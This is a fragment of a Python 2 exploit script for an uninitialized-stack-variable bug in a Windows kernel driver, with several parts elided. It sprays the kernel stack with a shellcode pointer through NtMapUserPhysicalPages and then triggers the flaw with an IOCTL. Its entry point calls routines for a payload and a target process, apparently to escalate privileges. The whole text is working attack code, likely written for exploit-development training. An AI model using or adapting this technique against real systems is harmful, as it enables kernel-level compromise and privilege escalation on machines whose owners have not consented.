...
NtMapUserPhysicalPages = windll.ntdll.NtMapUserPhysicalPages
...
### Create buffer, spray stack and send IOCTL ###
def trigger(hDevice, dwIoControlCode, shelladdr):
    inbuff = create_string_buffer("\x41\x41\x41\x41")
    ...
    lpOverlapped = None
    print "[*]Spraying shellcode pointer[*]"
    ### Spray shellcode pointer to overwrite stack variable ###
    ### http://j00ru.vexillium.org/?p=769 ###
    NtMapUserPhysicalPages(0, 1024, struct.pack("<L", shelladdr) * 1024)
    ...
    print "\t[+]Kernel stack sprayed and triggering vuln"
...
if __name__ == "__main__":
        print "\nUninitizilized Stack Variable\n"
        pid = boomHeadshot()
        shelladdr = shellcode(pid)
        trigger(gethandle(), ctl_code(0x80B), shelladdr)
